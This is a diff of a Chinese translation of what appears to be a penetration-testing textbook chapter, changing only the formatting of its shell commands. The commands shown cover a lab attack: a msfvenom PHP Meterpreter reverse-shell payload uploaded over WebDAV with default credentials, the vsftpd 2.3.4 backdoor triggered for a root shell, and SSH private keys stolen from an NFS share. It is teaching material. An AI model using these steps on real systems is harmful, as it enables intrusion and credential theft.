@@ -63,14 +63,14 @@ msf  exploit(ms08_067_netapi) > **exploit**
 在第六章中，我们发现目标 Windows XP 上的 XAMPP 安装使用 WebDAV 文件夹的默认登录凭据来上传文件到 Web 服务器。这个问题允许我们使用 Cadaver（一款 WebDAV 命令行客户端）上传自己的页面到服务器，我们在第六章中使用它来验证这个漏洞。让我们创建一个简单的测试文件来上传：
 
 ```
-root@kali:~# **cat test.txt**
+root@kali:~# cat test.txt
 test
 ```
 
 现在使用凭据*wampp:xampp*通过 WebDAV 进行身份验证。
 
 ```
-root@kali:~# **cadaver http://192.168.20.10/webdav**
+root@kali:~# cadaver http://192.168.20.10/webdav
 Authentication required for XAMPP with WebDAV on server `192.168.20.10':
 Username: **wampp**
 Password:
@@ -114,7 +114,7 @@ dav:/webdav/>
 示例 8-2. Metasploit PHP 有效载荷
 
 ```
-root@kali:~# **msfvenom -l payloads**
+root@kali:~# msfvenom -l payloads
 
     php/bind_perl❶               Listen for a connection and spawn a command
                                     shell via perl (persistent)
@@ -142,7 +142,7 @@ root@kali:~# **msfvenom -l payloads**
 Msfvenom 给我们提供了几种选择：我们可以下载并在系统上执行一个文件 ❷，创建一个 shell ❶，或者甚至使用 Meterpreter ❸。任何这些有效载荷都能让我们控制系统，但我们选择使用 *php/meterpreter/reverse_tcp*。指定有效载荷后，我们可以使用 `-o` 来查看需要与之一起使用的选项，如下所示。
 
 ```
-root@kali:~# **msfvenom -p php/meterpreter/reverse_tcp -o**
+root@kali:~# msfvenom -p php/meterpreter/reverse_tcp -o
 [*] Options for payload/php/meterpreter/reverse_tcp
 
 --*snip*--
@@ -155,7 +155,7 @@ root@kali:~# **msfvenom -p php/meterpreter/reverse_tcp -o**
 如你所见，我们需要设置 `LHOST` 来告诉有效载荷要连接回的 IP 地址，此外我们还可以更改 `LPORT` 选项。因为这个有效载荷已经是 PHP 格式，我们可以在设置好选项后使用 `-f` 选项将其以原始格式输出，然后将原始 PHP 代码通过管道输出到一个带 *.php* 扩展名的文件中，上传到服务器，如下所示。
 
 ```
-root@kali:~# **msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2323 -f raw > meterpreter.php**
+root@kali:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2323 -f raw > meterpreter.php
 ```
 
 现在我们使用 WebDAV 上传文件。
@@ -246,7 +246,7 @@ TFTP 不是唯一可以在非交互命令行访问下传输文件的方式。事
 我们可以使用 Atftpd TFTP 服务器在我们的 Kali 系统上托管文件。以守护进程模式启动 Atftpd，从 *meterpreter.php* 脚本所在的位置提供文件。
 
 ```
-root@kali:~# **atftpd --daemon --bind-address 192.168.20.9 /tmp**
+root@kali:~# atftpd --daemon --bind-address 192.168.20.9 /tmp
 ```
 
 在 *shell.php* 脚本中设置 `cmd` 参数，如下所示：
@@ -497,7 +497,7 @@ meterpreter >
 示例 8-9. 触发 Vsftpd 后门
 
 ```
-root@kali:~# **ftp 192.168.20.11**
+root@kali:~# ftp 192.168.20.11
 Connected to 192.168.20.11.
 220 (vsFTPd 2.3.4)
 Name (192.168.20.11:root): georgia:)
@@ -508,8 +508,8 @@ Password:
 我们注意到密码输入后登录被挂起。这告诉我们 FTP 服务器仍在处理我们的登录尝试，如果我们再次查询 FTP 端口，它将继续响应。让我们使用 Netcat 尝试连接到端口 6200，如果后门存在的话，根 shell 应该会在该端口启动。
 
 ```
-root@kali:~# **nc 192.168.20.11 6200**
-# **whoami**
+root@kali:~# nc 192.168.20.11 6200
+# whoami
 root
 ```
 
@@ -522,15 +522,15 @@ root
 回想一下，当我们在第六章扫描 NFS 挂载时，我们看到了*.ssh*目录。这个目录可能包含用户的私有 SSH 密钥以及用于通过 SSH 验证用户的密钥。让我们看看能否利用这个共享。首先，在你的 Kali 系统上挂载 NFS 共享。
 
 ```
-root@kali:~# **mkdir /tmp/mount**
-root@kali:~# **mount -t nfs -o nolock 192.168.20.11:/export/georgia /tmp/mount**
+root@kali:~# mkdir /tmp/mount
+root@kali:~# mount -t nfs -o nolock 192.168.20.11:/export/georgia /tmp/mount
 ```
 
 一开始这看起来并不太有希望，因为*georgia*没有文档、图片或视频——只有一些我们将在第十六章中使用的简单缓冲区溢出示例。这里似乎没有敏感信息，但在我们得出结论之前，让我们看看*.ssh*目录里有什么。
 
 ```
-root@kali:~# **cd /tmp/mount/.ssh**
-root@kali:/tmp/mount/.ssh# **ls**
+root@kali:~# cd /tmp/mount/.ssh
+root@kali:/tmp/mount/.ssh# ls
 authorized_keys  id_rsa  id_rsa.pub
 ```
 
@@ -539,7 +539,7 @@ authorized_keys  id_rsa  id_rsa.pub
 示例 8-10. 生成新的 SSH 密钥对
 
 ```
-root@kali:~# **ssh-keygen**
+root@kali:~# ssh-keygen
 Generating public/private rsa key pair.
 Enter file in which to save the key (/root/.ssh/id_rsa):
 Enter passphrase (empty for no passphrase):
@@ -560,13 +560,13 @@ The key's randomart image is:
 接下来，让我们将新生成的公钥追加到*georgia*的*authorized_keys*文件中。使用`cat`命令将*/root/.ssh/id_rsa.pub*文件的内容输出，并将其追加到*georgia*的*authorized_keys*文件中。
 
 ```
-root@kali:~# **cat ~/.ssh/id_rsa.pub >> /tmp/mount/.ssh/authorized_keys**
+root@kali:~# cat ~/.ssh/id_rsa.pub >> /tmp/mount/.ssh/authorized_keys
 ```
 
 我们现在应该能够以*georgia*身份通过 SSH 连接到 Linux 目标。让我们试试看。
 
 ```
-root@kali:~# **ssh georgia@192.168.20.11**
+root@kali:~# ssh georgia@192.168.20.11
 georgia@ubuntu:~$
 ```
 
@@ -575,18 +575,18 @@ georgia@ubuntu:~$
 我们也可以通过将*georgia*的密钥复制到 Kali 机器来获得访问权限。为此，我们首先删除我们创建的 SSH 身份。
 
 ```
-root@kali:/tmp/mount/.ssh# **rm ~/.ssh/id_rsa.pub**
-root@kali:/tmp/mount/.ssh# **rm ~/.ssh/id_rsa**
+root@kali:/tmp/mount/.ssh# rm ~/.ssh/id_rsa.pub
+root@kali:/tmp/mount/.ssh# rm ~/.ssh/id_rsa
 ```
 
 现在，我们将*georgia*的私钥（*id_rsa*）和公钥（*id_rsa.pub*）复制到 Kali 上 root 的*.ssh*目录，并使用`ssh-add`命令将身份添加到认证代理中，然后再尝试通过 SSH 连接到 Linux 目标。
 
 ```
-root@kali:/tmp/mount/.ssh# **cp id_rsa.pub ~/.ssh/id_rsa.pub**
-root@kali:/tmp/mount/.ssh# **cp id_rsa ~/.ssh/id_rsa**
-root@kali:/tmp/mount/.ssh# **ssh-add**
+root@kali:/tmp/mount/.ssh# cp id_rsa.pub ~/.ssh/id_rsa.pub
+root@kali:/tmp/mount/.ssh# cp id_rsa ~/.ssh/id_rsa
+root@kali:/tmp/mount/.ssh# ssh-add
 Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)
-root@kali:/tmp/mount/.ssh# **ssh georgia@192.168.20.11**
+root@kali:/tmp/mount/.ssh# ssh georgia@192.168.20.11
 Linux ubuntu 2.6.27-7-generic #1 SMP Fri Oct 24 06:42:44 UTC 2008 i686
 georgia@ubuntu:~$
 ```
